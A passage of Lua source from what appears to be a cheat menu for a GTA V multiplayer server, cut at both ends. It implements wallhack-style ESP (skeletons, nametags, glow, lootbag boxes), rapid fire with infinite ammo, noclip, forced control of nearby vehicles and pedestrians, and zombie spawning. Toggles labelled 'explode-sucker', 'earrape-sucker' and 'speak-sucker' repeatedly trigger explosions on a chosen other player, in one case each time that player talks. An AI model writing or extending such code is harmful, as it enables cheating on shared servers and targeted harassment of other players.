                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xB1C5, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xEEEB, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xEEEB, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x49D9, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x9D4D, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x9D4D, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x6E5C, 0.0, 0.0, 0.0),r, g, b, 255)
                               sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x6E5C, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xDEAD, 0.0, 0.0, 0.0),r, g, b, 255)
                           end
                       else
                           local r, g, b = sum.s['visuals-skeletons-r'].value, sum.s['visuals-skeletons-g'].value, sum.s['visuals-skeletons-b'].value		
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 31086, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x5C57, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x192A, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xE0FD, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x3FCF, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x192A, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xCC4D, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x3FCF, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xB3FE, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x5C57, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xB3FE, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x3779, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xB1C5, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xB1C5, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xEEEB, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0xEEEB, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x49D9, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x9995, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x9D4D, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x9D4D, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0x6E5C, 0.0, 0.0, 0.0),r, g, b, 255)
                           sum.f.DrawLine(sum.f.GetPedBoneCoordsF(ped, 0x6E5C, 0.0, 0.0, 0.0),sum.f.GetPedBoneCoordsF(ped, 0xDEAD, 0.0, 0.0, 0.0),r, g, b, 255)
                       end
                   end
               end
           end
       end
   
       if sum.c['explode-sucker'] then
           local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
           sum.f.AddExplosion(coord, 7, 100.0, true, false, 1.0)
       end
   
       if sum.c['earrape-sucker'] then
           local position = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
           for i = 0, 5 do
               sum.f.AddExplosion(position.x, position.y - 1, position.z, 61, 0, true, true, 0)
               sum.f.AddExplosion(position.x, position.y - 1, position.z, 61, 0, true, true, 0)
               sum.f.AddExplosion(position.x, position.y - 1, position.z, 61, 0, true, true, 0)
           end
       end
   
       if sum.c['speak-sucker'] then
           if sum.f.NetworkIsPlayerTalking(sel.selectedPlayer) then
               local coord = sum.f.GetEntityCoords(sum.f.GetPlayerPed(sel.selectedPlayer))
           sum.f.AddExplosion(coord, 7, 100.0, true, false, 1.0)
       end
   end
   
   --[[if sum.c['visuals-nametags'] then 
       for _, ped in pairs(sum.f.GetActivePlayers()) do
           local x, y, z = table.unpack(sum.f.GetEntityCoords( sum.f.GetPlayerPed(ped)))
           local x1, y1, z1 = table.unpack(sum.f.GetEntityCoords(sum.f.PlayerPedId()))
           local dist = tonumber(sum.curak.format("%.1f", sum.f.GetDistanceBetweenCoords(x1, y1, z1, x, y, z, true)))
           local string = ''..sum.f.GetPlayerServerId(ped)..' | '..  sum.f.GetPlayerName(ped).. ' ('.. dist.. 'm)'
           if dist < sum.s['visuals-distance'].value and sum.f.GetPlayerPed(ped) ~= sum.f.PlayerPedId() then                
               if sum.f.NetworkIsPlayerTalking(ped) then    
                   sum.f.drawText3DNametag(x, y, z + 1.25, string, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value, 255)
               else
                   sum.f.drawText3DNametag(x, y, z + 1.25, string, sum.s['visuals-nametags-r'].value, sum.s['visuals-nametags-g'].value, sum.s['visuals-nametags-b'].value, 255)
               end
           end
       end
   end]]
   
   if sum.c['visuals-nametags'] then 
       for _, ped in pairs(sum.f.GetActivePlayers()) do
           local x, y, z = table.unpack(sum.f.GetEntityCoords( sum.f.GetPlayerPed(ped)))
           local _, _x, _y = sum.f.GetScreenCoordFromWorldCoord(x, y, z)   
           local x1, y1, z1 = table.unpack(sum.f.GetEntityCoords(sum.f.PlayerPedId()))
           local dist = tonumber(sum.curak.format("%.1f", sum.f.GetDistanceBetweenCoords(x1, y1, z1, x, y, z, true)))
           local string = ''..sum.f.GetPlayerServerId(ped)..' | '..  sum.f.GetPlayerName(ped).. ' ('.. dist.. 'm)'
           if dist < sum.s['visuals-distance'].value and sum.f.GetPlayerPed(ped) ~= sum.f.PlayerPedId() then                
               sum.f.SetTextColour(sum.s['visuals-nametags-r'].value, sum.s['visuals-nametags-g'].value, sum.s['visuals-nametags-b'].value, 255)
               if sum.f.NetworkIsPlayerTalking(ped) then           
                   sum.f.drawTextOutline(string, _x, _y-1.0/sum.f.GetDistanceBetweenCoords(sum.f.GetFinalRenderedCamCoord(), x, y, z, false), 0.18, 4, true, true, sum.s['menu-r'].value, sum.s['menu-g'].value, sum.s['menu-b'].value)
               else
                   sum.f.drawTextOutline(string, _x, _y-1.0/sum.f.GetDistanceBetweenCoords(sum.f.GetFinalRenderedCamCoord(), x, y, z, false), 0.18, 4, true, true, sum.s['visuals-nametags-r'].value, sum.s['visuals-nametags-g'].value, sum.s['visuals-nametags-b'].value)
               end
           end
       end
   end
   
   
       if sum.c['visuals-holdingweapons'] then
               for k, v in pairs(sum.f.GetActivePlayers()) do
               if sum.f.GetPlayerPed(v) ~= sum.f.PlayerPedId() then
                   local _, weaponhash = sum.f.GetCurrentPedWeapon(sum.f.GetPlayerPed(v), true)
                   local hweapon = sum.f.WepFromHash(weaponhash)
                   local x1, y1, z1 = table.unpack(sum.f.GetEntityCoords(sum.f.PlayerPedId(), true) )
                   local x2, y2, z2 = table.unpack(sum.f.GetEntityCoords(sum.f.GetPlayerPed(v), true) )
                   local distance = #(sum.curak.vector3(x1, y1, z1) - sum.curak.vector3(x2, y2, z2))
                   local r, g, b = sum.s['visuals-holdingweapons-r'].value, sum.s['visuals-holdingweapons-g'].value, sum.s['visuals-holdingweapons-b'].value
                   if hweapon == nil then 
                       hweapon = "Fists" 
                   end
                   if distance < sum.s['visuals-distance'].value then
                       sum.f.drawText3D(x2, y2, z2 - 1.0, ""..  string.upper(hweapon), r, g, b, 255)
                   end
               end
           end
       end
   
       if sum.c['visuals-glow-esp'] then
          if sum.c['visuals-glow-esp'] then
           for p in sum.f.enumeratePeds() do 
                   local color = sum.f.rgb(2.5)
                   local range = 0.4
                   local me = p ~= sum.f.PlayerPedId() 
                   local mr = sum.f.IsPedAPlayer(p)
                   local c = sum.f.GetEntityCoords(p)
                   local d = sum.f.GetDistanceBetweenCoords(sum.f.GetFinalRenderedCamCoord(), c.x, c.y, c.z, false)
                   if sum.c['rainbow-glow-esp'] then 
                       r, g, b = color.r, color.g, color.b
                   else
                       r, g, b = sum.s['visuals-glow-r'].value, sum.s['visuals-glow-g'].value, sum.s['visuals-glow-b'].value
                   end
                   if d < sum.s['visuals-distance'].value then
                   if me and mr and not sum.f.IsEntityDead(p) and sum.f.IsEntityOnScreen(p) then 
                       sum.f.ambientGlow(p, r, g, b, range, 180.0)
                       sum.f.ambientGlowlegs(p, r, g, b, 0.1, 200.0)
                       sum.f.ambientGlowwhite(p, 255, 255, 255, 0.1, 180.0)
                   end
               end
           end
       end
   end
           --[[local bones = {0,23553,0x796e,0x0,24817,24818,24816,11816,31086,0xcc4d,0x9995,0x3779,0xE0FD,0x5C57,0x192A,0x9995,0xB1C5,0xEEEB,0x49D9,0x9D4D,0x6E5C,0xDEAD,0x5c01}
           for ped in sum.f.enumeratePeds() do 
               local color = sum.f.rgb(2.5)
               if sum.c['rainbow-glow-esp'] then 
                   r, g, b = color.r, color.g, color.b
               else
                   r, g, b = sum.s['visuals-glow-r'].value, sum.s['visuals-glow-g'].value, sum.s['visuals-glow-b'].value
               end
               for _, bone in pairs(bones) do 
                   local coords = sum.f.GetPedBoneCoords(ped, bone, 0.0, 0.0, 0.0)
                   sum.f.DrawLightWithRangeAndShadow(coords.x,coords.y,coords.z,r,g,b,1.0,15000.0,15000.0)
               end
           end
       end]]
   
       if sum.c['visuals-lines'] then
           --for k, i in pairs(sum.f.GetActivePlayers()) do
           for myped in sum.f.enumeratePeds() do
                --if i ~= sum.f.PlayerId() and sum.f.GetActivePlayers() and sum.f.GetPlayerServerId(i) ~= 0 then
                  -- local myped = sum.f.GetPlayerPed(i)
                   local Selfx, Selfy, Selfz = table.unpack(sum.f.GetPedBoneCoordsF(sum.f.PlayerPedId(), 0x0, 0.0, 0.0, 0.0))
                   local x, y, z = table.unpack(sum.f.GetPedBoneCoordsF(myped, 0x0, 0.0, 0.0, 0.0))
                   local distance = #(sum.curak.vector3(Selfx, Selfy, Selfz) - sum.curak.vector3(x, y, z))
                   local mr = sum.f.IsPedAPlayer(myped)
               if mr then
                   if distance < sum.s['visuals-distance'].value then
                       if sum.c['visuals-lines-vis'] and not sum.f.IsEntityDead(myped) then
                           if sum.f.HasEntityClearLosToEntity(sum.f.PlayerPedId(), myped, 19) then 
                           local r, g, b = sum.s['visuals-lines-vis-r'].value, sum.s['visuals-lines-vis-g'].value, sum.s['visuals-lines-vis-b'].value             
                           sum.f.DrawLine(Selfx,Selfy,Selfz,x,y,z,r,g,b,255)
                           else
                               local r, g, b = sum.s['visuals-lines-r'].value, sum.s['visuals-lines-g'].value, sum.s['visuals-lines-b'].value
                               sum.f.DrawLine(Selfx,Selfy,Selfz,x,y,z,r,g,b,255)
                           end
                       else
                           local r, g, b = sum.s['visuals-lines-r'].value, sum.s['visuals-lines-g'].value, sum.s['visuals-lines-b'].value
                           sum.f.DrawLine(Selfx,Selfy,Selfz,x,y,z,r,g,b,255)
                       end
                   end
               end
           end       
       end
   
   
   
       if sum.c['lootbags'] then
           for obj in sum.f.enumerateObjects() do 
               if sum.f.IsEntityOnScreen(obj) then 
                   local coords = sum.f.GetEntityCoords(obj)
                   local x, y, z = table.unpack(coords)
                   local r, g, b = sum.s['lootbag-color-r'].value, sum.s['lootbag-color-g'].value, sum.s['lootbag-color-b'].value
                   local selfcoords = sum.f.GetEntityCoords(sum.f.PlayerPedId())
                   local dist = sum.f.GetDistanceBetweenCoords(selfcoords, x, y, z, true)
                   if dist < 40 then
                       if sum.f.GetEntityModel(obj) == sum.f.GetHashKey('prop_big_bag_01') then 
                           sum.f.SetDrawOrigin(x, y, z, 0)
                           sum.f.SetTextColour(r, g, b, 255)
                           sum.f.drawText('Lootbag ('..string.format('%.1f', dist)..'m)', 0.0, 0.0, 0.23, 4, true, true)
                           sum.f.ClearDrawOrigin()                    
                       end
                   end
               end 
           end
       end
   
   
       if sum.c['lootbags-line'] then
           for v in sum.f.enumerateObjects() do
               local r, g, b = sum.s['lootbag-color-r'].value, sum.s['lootbag-color-g'].value, sum.s['lootbag-color-b'].value
               local myCoords = sum.f.GetEntityCoords(sum.f.PlayerPedId())
               local getlootbag = sum.f.GetEntityCoords(v)
               local dist = sum.f.GetDistanceBetweenCoords(sum.f.GetEntityCoords(sum.f.PlayerPedId()),sum.f.GetEntityCoords(v), false) 
               if dist < 40 then
                   if sum.f.GetEntityModel(v) == sum.f.GetHashKey('prop_big_bag_01') then 
                           sum.f.DrawLine(myCoords, getlootbag, r, g, b, 255)
                       end
                   end
               end
           end
   
       
       
   
   if sum.c['lootbags-box'] then
       for v in sum.f.enumerateObjects() do
           local r, g, b = sum.s['lootbag-color-r'].value, sum.s['lootbag-color-g'].value, sum.s['lootbag-color-b'].value
           local getlootbag = sum.f.GetEntityCoords(v)
           local X, Y = sum.f.GetActiveScreenResolution()
           local x,y,z = table.unpack(getlootbag)
           local d = sum.f.GetDistanceBetweenCoords(sum.f.GetFinalRenderedCamCoord(),sum.f.GetEntityCoords(v), false) 
           if d < 40 then
               if sum.f.GetEntityModel(v) == sum.f.GetHashKey('prop_big_bag_01') then 
                   sum.f.SetDrawOrigin(x, y, z, 0)
                   sum.f.DrawRect(0 - (0.3/2)/d, 0, 1/X, (0.3*1.8)/d, r, g, b, 255)
                   sum.f.DrawRect(0 + (0.3/2)/d, 0, 1/X, (0.3*1.8)/d, r, g, b, 255)
                   sum.f.DrawRect(0, 0 - (((0.3*1.8)/2))/d, (0.3)/d, 1/Y, r, g, b, 255)
                   sum.f.DrawRect(0, 0 + ((0.3*1.8)/2)/d, (0.3)/d, 1/Y, r, g, b, 255)
                   sum.f.ClearDrawOrigin()
               end
           end
       end
   end
   
   if sum.c['dungeon-generator'] then
       for v in sum.f.enumerateObjects() do
           local r, g, b = sum.s['dungeon-color-r'].value, sum.s['dungeon-color-g'].value, sum.s['dungeon-color-b'].value
           local x, y, z = table.unpack(sum.f.GetEntityCoords(v))
           local dist = sum.f.GetDistanceBetweenCoords(sum.f.GetEntityCoords(sum.f.PlayerPedId()),sum.f.GetEntityCoords(v), false) 
           if sum.f.GetEntityModel(v) == -993191322 then
               sum.f.drawText3D(x, y, z, "Generator (" .. sum.curak.floor(dist).. "m)", r, g, b, 255)
           end
       end
   end
   
   if sum.c['hide-id'] then
       sum.f.DrawRect(1.0, 0.0, 0.20, 0.14, 70, 70, 70, 255)
   end
   
   if sum.c['crosshair'] then 
       local r, g, b = sum.s['crosshair-r'].value, sum.s['crosshair-g'].value, sum.s['crosshair-b'].value
       local gap, thickness, size = sum.s['crosshair-gap'].value, sum.s['crosshair-thickness'].value, sum.s['crosshair-size'].value
       local resX, resY = sum.f.GetActiveScreenResolution()
       if sum.c['crosshair-outline'] then 
           sum.f.DrawRect(0.5-gap/resX-size/resX/2, 0.5, (size+2)/resX, (thickness+2)/resY, 1, 1, 1, 255)
           sum.f.DrawRect(0.5+gap/resX+size/resX/2-0.0005 , 0.5, (size+2)/resX, (thickness+2)/resY, 1, 1, 1, 255)
           sum.f.DrawRect(0.5, 0.5-gap/resY-size/resY/2, (thickness+2)/resX, (size+2)/resY, 1, 1, 1, 255)
           sum.f.DrawRect(0.5, 0.5+gap/resY+size/resY/2-0.0005 , (thickness+2)/resX, (size+2)/resY, 1, 1, 1, 255)
           if sum.c['crosshair-dot'] then 
               sum.f.DrawRect(0.5, 0.5, (thickness+2)/resX, (thickness+2)/resY, 1, 1, 1, 255)
           end
       end
       sum.f.DrawRect(0.5-gap/resX-size/resX/2, 0.5, size/resX, thickness/resY, r, g, b, 255)
       sum.f.DrawRect(0.5+gap/resX+size/resX/2-0.0005 , 0.5, size/resX, thickness/resY, r, g, b, 255)
       sum.f.DrawRect(0.5, 0.5-gap/resY-size/resY/2, thickness/resX, size/resY, r, g, b, 255)
       sum.f.DrawRect(0.5, 0.5+gap/resY+size/resY/2-0.0005 , thickness/resX, size/resY, r, g, b, 255)
       if sum.c['crosshair-dot'] then 
           sum.f.DrawRect(0.5, 0.5, (thickness)/resX, (thickness)/resY, r, g, b, 255)
       end
   end
   
   if sum.c["noprop-glife-second"] then
       for objects in sum.f.enumerateObjects() do
           sum.f.SetEntityAlpha(objects, sum.s['glife-prop-value'].value, false)
       end
   end
   
   if sum.c["noprop-glife"] then
       sum.f.deleteobjects()
   end
   
   if sum.c["fillamo-glife"] then
       local p = sum.f.PlayerPedId()
       local _, gun = sum.f.GetCurrentPedWeapon(p)
       sum.f.SetPedAmmo(p, gun, sum.f.GetWeaponClipSize(gun))  
       sum.f.RefillAmmoInstantly(p, true)
       sum.f.SetPedInfiniteAmmoClip(p, true)
   end
   
   if sum.c["weapons-rapidFire"] then
       local p = sum.f.PlayerPedId()
       local _, gun = sum.f.GetCurrentPedWeapon(p)
       if sum.f.IsAimCamActive() and sum.f.IsPedShooting(sum.f.PlayerPedId()) and sum.f.IsAimCamThirdPersonActive() then
           sum.f.SetPedAmmo(p, gun, sum.f.GetWeaponClipSize(gun))  
           sum.f.RefillAmmoInstantly(p, true)
           sum.f.SetPedInfiniteAmmoClip(p, true)
           sum.f.KeySimulation(0x11, 0)
       end
       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId()) then 
           sum.f.SetPedAmmo(p, gun, sum.f.GetWeaponClipSize(gun))  
           sum.f.RefillAmmoInstantly(p, true)
           sum.f.SetPedInfiniteAmmoClip(p, true)
       end
   end
   
   if sum.c["weapons-rapidFire-glife"] then
       local p = sum.f.PlayerPedId()
       local _, gun = sum.f.GetCurrentPedWeapon(p)
       if sum.f.IsAimCamActive() and sum.f.IsPedShooting(sum.f.PlayerPedId()) and sum.f.IsAimCamThirdPersonActive() then
           sum.f.SetPedAmmo(p, gun, sum.f.GetWeaponClipSize(gun))  
           sum.f.RefillAmmoInstantly(p, true)
           sum.f.SetPedInfiniteAmmoClip(p, true)
           sum.f.KeySimulation(0x11, 0)
       end
       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId()) then 
           sum.f.SetPedAmmo(p, gun, sum.f.GetWeaponClipSize(gun))  
           sum.f.RefillAmmoInstantly(p, true)
           sum.f.SetPedInfiniteAmmoClip(p, true)
       end
   end
   
   
   
   if sum.c["magneto-mode"] then
       local ForceKey = 51
       local Force = 0.5
       local KeyPressed = false
       local KeyTimer = 0
       local KeyDelay = 15
       local ForceEnabled = false
       local StartPush = false
       if KeyPressed then
           KeyTimer = KeyTimer + 1
           if KeyTimer >= KeyDelay then
               KeyTimer = 0
               KeyPressed = false
           end
       end
       if sum.f.IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
           KeyPressed = true
           ForceEnabled = true
       end
       if (StartPush) then
           StartPush = false
           local pid = sum.f.PlayerPedId()
           local CamRot = sum.f.GetGameplayCamRot(2)
           local force = 5
           local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
           local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
           local Fz = force * (CamRot.x * 0.2)
           local PlayerVeh = sum.f.GetVehiclePedIsIn(pid, false)
           for k in sum.f.enumerateVehicles() do
               sum.f.SetEntityInvincible(k, false)
               if sum.f.IsEntityOnScreen(k) and k ~= PlayerVeh then
                   sum.f.ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
               end
           end
           for k in sum.f.enumeratePeds() do
               if sum.f.IsEntityOnScreen(k) and k ~= pid then
                   sum.f.ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
               end
           end
       end
       if sum.f.IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
           KeyPressed = true
           StartPush = true
           ForceEnabled = false
       end
       if ForceEnabled then
           local pid = sum.f.PlayerPedId()
           local PlayerVeh = sum.f.GetVehiclePedIsIn(pid, false)
           Markerloc = sum.f.GetGameplayCamCoord() + (sum.f.rotationToDirection(sum.f.GetGameplayCamRot(2)) * 20)
           sum.f.DrawMarker(sum.s['magneto-marker'].value, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, sum.s['magneto-r'].value, sum.s['magneto-g'].value, sum.s['magneto-b'].value,--[[colors]] 255, false, true, 2, nil, nil, false)
           for k in sum.f.enumerateVehicles() do
               sum.f.SetEntityInvincible(k, true)
               if sum.f.IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                   sum.f.requestControlOnce(k)
                   sum.f.FreezeEntityPosition(k, false)
                   sum.f.Oscillate(k, Markerloc, sum.s['magneto-power'].value, 0.3)
               end
           end
           for k in sum.f.enumeratePeds() do
               if sum.f.IsEntityOnScreen(k) and k ~= sum.f.PlayerPedId() then
                   sum.f.requestControlOnce(k)
                   sum.f.FreezeEntityPosition(k, false)
                   sum.f.Oscillate(k, Markerloc, sum.s['magneto-power'].value, 0.3)
               end
           end
       end
   end
   
   
   
   
   if sum.c['glife-zombies'] then
       local myCoords = sum.f.GetEntityCoords(sum.f.PlayerPedId())
       local zombietable = {"s_m_m_marine_01", "s_m_y_marine_01", "a_m_m_mexcntry_01","a_m_m_polynesian_01","a_m_m_skidrow_01","a_m_y_genstreet_01","a_m_y_genstreet_02","a_m_y_stlat_01","csb_ramp_hic","a_m_m_fatlatin_01","a_m_m_rurmeth_01","a_m_m_hillbilly_02","a_m_m_hillbilly_01","s_m_y_prisoner_01","s_m_y_prismuscl_01","a_m_m_salton_01","a_m_y_salton_01",}
       local randomzombie = (zombietable[math.random(#zombietable)])
       if not sum.f.HasModelLoaded(sum.f.GetHashKey(randomzombie)) then 
           sum.f.RequestModel(sum.f.GetHashKey(randomzombie))
       end
       for i = 1, 2 do 
           sum.f.CreatePed(4, sum.f.GetHashKey(randomzombie), myCoords.x + 80 , myCoords.y + 80, myCoords.z, 0.0, false, true)
       end
   end
   
   if sum.c["noclip-glife"] then
       local speed = 0.5
       local speedcar = sum.s["glife-noclip-value"].value
       local speedbypass = 0.08
       local vehicleecheck = sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0)
       local player = nil
       local x, y, z = nil
       local Camerax, Cameray, Cameraz = sum.f.camDirect()
   
       if not vehicleecheck then
           player = sum.f.PlayerPedId()
           x, y, z = table.unpack(sum.f.GetEntityCoords(sum.f.PlayerPedId(), 2))
       else
           player = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), 0)
           x, y, z = table.unpack(sum.f.GetEntityCoords(sum.f.PlayerPedId(), 1))
       end
       if vehicleecheck and sum.f.getSeatPedIsIn(sum.f.PlayerPedId()) ~= -1 then
           sum.f.requestControlOnce(player)
       end
   
       if vehicleecheck and sum.f.IsDisabledControlPressed(0, 32) and sum.f.getSeatPedIsIn(sum.f.PlayerPedId()) ~= -1 then
           x = x + speedbypass * speedcar * Camerax
           y = y + speedbypass * speedcar * Cameray
           z = z + speedbypass * speedcar * Cameraz
           sum.f.requestControlOnce(player)
       end
       if vehicleecheck and sum.f.IsDisabledControlPressed(0, 269) and sum.f.getSeatPedIsIn(sum.f.PlayerPedId()) ~= -1 then
           x = x - speedbypass * speedcar * Camerax
           y = y - speedbypass * speedcar * Cameray
           z = z - speedbypass * speedcar * Cameraz
           sum.f.requestControlOnce(player)
       end
   
       sum.f.SetEntityVelocity(player, 0.0001, 0.0001, 0.0001)
       if sum.f.IsDisabledControlPressed(0, 32) then
           sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), true)
           x = x + speedbypass * Camerax
           y = y + speedbypass * Cameray
           z = z + speedbypass * Cameraz
       end
       if sum.f.IsDisabledControlPressed(0, 269) then
           sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), true)
           x = x - speedbypass * Camerax
           y = y - speedbypass * Cameray
           z = z - speedbypass * Cameraz
       end
       if sum.f.IsDisabledControlPressed(0, 22) then
           sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), true)
           z = z + speed
       end
       if sum.f.IsDisabledControlPressed(0, 36) then
           sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), true)
           z = z - speed
       end
       sum.f.SetEntityCoordsNoOffset(player, x, y, z, true, true, true)
   end
   
   if sum.c['glife-superrun-slide'] then 
       if sum.f.IsDisabledControlPressed(0, 34) or sum.f.IsDisabledControlPressed(0, 33) or sum.f.IsDisabledControlPressed(0, 32) or sum.f.IsDisabledControlPressed(0, 35) then
           if sum.f.IsPedRagdoll(sum.f.PlayerPedId()) then
               
           else
              sum.f.SetEntityVelocity(
                  sum.f.PlayerPedId(), 
                  sum.f.GetOffsetFromEntityInWorldCoords(
                      sum.f.PlayerPedId(), 
                      0.0, 
                      12.0, 
                      sum.f.GetEntityVelocity(sum.f.PlayerPedId())[3]
                   ) - sum.f.GetEntityCoords(
                       sum.f.PlayerPedId()
                   )
               )
           end
       end
   end
   
   if sum.c["noclip-glife-experimental"] then
       local speed = 1
       local speedcar = 0.08 * 10.0
       local speedbypass = sum.s["exglife-noclip-value"].value
       local vehicleecheck = sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0)
       local player = nil
       local x, y, z = nil
       local Camerax, Cameray, Cameraz = sum.f.camDirect()
   
       if not vehicleecheck then
           player = sum.f.PlayerPedId()
           x, y, z = table.unpack(sum.f.GetEntityCoords(sum.f.PlayerPedId(), 2))
       else
           player = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), 0)
           x, y, z = table.unpack(sum.f.GetEntityCoords(sum.f.PlayerPedId(), 1))
       end
       if vehicleecheck and sum.f.getSeatPedIsIn(sum.f.PlayerPedId()) ~= -1 then
           sum.f.requestControlOnce(player)
       end
   
       if vehicleecheck and sum.f.IsDisabledControlPressed(0, 32) and sum.f.getSeatPedIsIn(sum.f.PlayerPedId()) ~= -1 then
           x = x + speedbypass * speedcar * Camerax
           y = y + speedbypass * speedcar * Cameray
           z = z + speedbypass * speedcar * Cameraz
           sum.f.requestControlOnce(player)
       end
       if vehicleecheck and sum.f.IsDisabledControlPressed(0, 269) and sum.f.getSeatPedIsIn(sum.f.PlayerPedId()) ~= -1 then
           x = x - speedbypass * speedcar * Camerax
           y = y - speedbypass * speedcar * Cameray
           z = z - speedbypass * speedcar * Cameraz
           sum.f.requestControlOnce(player)
       end
   
       sum.f.SetEntityVelocity(player, 0.0001, 0.0001, 0.0001)
       if sum.f.IsDisabledControlPressed(0, 32) then
           sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), true)
           x = x + speedbypass * Camerax
           y = y + speedbypass * Cameray
           z = z + speedbypass * Cameraz
       end
       if sum.f.IsDisabledControlPressed(0, 269) then
           sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), true)
           x = x - speedbypass * Camerax
           y = y - speedbypass * Cameray
           z = z - speedbypass * Cameraz
       end
       if sum.f.IsDisabledControlPressed(0, 22) then
           sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), true)
           z = z + speed
       end
       if sum.f.IsDisabledControlPressed(0, 36) then
           sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), true)
           z = z - speed
       end
       sum.f.SetEntityCoordsNoOffset(player, x, y, z, true, true, true)
   end
   
   if sum.c["teleport-zombies"] then
       for ped in sum.f.enumeratePeds() do
           local coords = sum.f.GetEntityCoords(sum.f.PlayerPedId(), true)
           if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
               sum.f.requestControlOnce(ped)
               sum.f.FreezeEntityPosition(ped, true)
               if not sum.f.IsEntityDead(ped) then
                   sum.f.SetEntityCoords(ped, coords.x + 3, coords.y, coords.z)
               end
               if sum.f.IsEntityDead(ped) then 
                   sum.f.SetEntityVisible(ped, false, false)
               end
           end
       end
   end
   
   if sum.c["kill-zombies"] then
       for ped in sum.f.enumeratePeds() do
           if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
               sum.f.requestControlOnce(ped)
               sum.f.SetEntityHealth(ped, 0)
           end
       end
   end
   
   if sum.c["oneshot-zombies"] then
       for ped in sum.f.enumeratePeds() do
           if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
               sum.f.requestControlOnce(ped)
               sum.f.SetEntityHealth(ped, 101)
           end
       end
   end
   
   
   if sum.c["teleport-zombies-invisible"] then
       for ped in sum.f.enumeratePeds() do
           if not sum.f.IsPedAPlayer(ped) and ped ~= sum.f.PlayerPedId() then
               sum.f.SetEntityVisible(ped, false, false)
           else
               sum.f.SetEntityVisible(ped, true, true)
           end
       end
   end
   
   
   if sum.c["auto-kill-zombies"] then
       for ped in sum.f.enumeratePeds() do
